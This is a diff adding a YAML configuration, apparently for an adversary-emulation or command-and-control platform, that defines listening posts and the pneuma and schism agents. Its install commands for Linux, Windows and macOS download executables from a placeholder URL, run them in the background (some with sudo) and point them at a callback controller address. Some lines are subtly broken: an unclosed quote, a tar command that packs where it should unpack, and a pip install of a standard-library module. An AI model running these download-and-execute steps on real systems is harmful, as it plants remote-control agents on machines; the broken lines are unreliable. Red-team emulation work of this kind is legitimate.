@@ -1,0 +1,61 @@
+translators:
+  metadata:
+    description: An extra Operator listening post
+    build: build.sh
+  payloads:
+    ftp.tar.gz:
+      install: |
+        mkdir -p /tmp/translators && \
+        curl "PAYLOAD.URL > /tmp/translators/ftp.tar.gz && \
+        tar zcf /tmp/translators/ftp.tar.gz /tmp/translators && \
+        sudo pip3 install -r /tmp/translators/ftp/requirements.txt && \
+        nohup sudo python3 /tmp/translators/ftp/server.py &
+    grpc.tar.gz:
+      install: |
+        mkdir -p /tmp/translators && \
+        curl "PAYLOAD.URL" > /tmp/translators/grpc.tar.gz && \
+        tar zcf /tmp/translators/grpc.tar.gz /tmp/translators && \
+        sudo pip3 install -r /tmp/translators/grpc/requirements.txt && \
+        nohup sudo python3 /tmp/translators/grpc/server.py &
+
+pneuma:
+  metadata:
+    description: The default open-source agent written in GoLang
+    build: build.sh
+    platforms:
+      - linux
+      - windows
+      - darwin
+    protocols:
+      - tcp
+      - http
+      - udp
+      - grpc
+  payloads:
+    pneuma-linux:
+      install: |
+        curl PAYLOAD.URL > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
+    pneuma-windows:
+      install: |
+        mkdir "c:\aws\download"
+        Set-Location "c:\aws\download"
+        $wc = New-Object System.Net.WebClient
+        $myurl="PAYLOAD.URL"
+        $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
+        Start-Process -FilePath pneuma-windows.exe -ArgumentList "-name
+        $env:COMPUTERNAME -address #{callback} -range Cloud"
+    pneuma-darwin: {}
+
+schism:
+  metadata:
+    description: Simple FTP agent (requires a translator)
+    platforms: 
+      - windows
+      - linux
+      - darwin
+    protocols:
+      - ftp
+  payloads:
+    schism.py:
+      install: |
+        curl PAYLOAD.URL > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
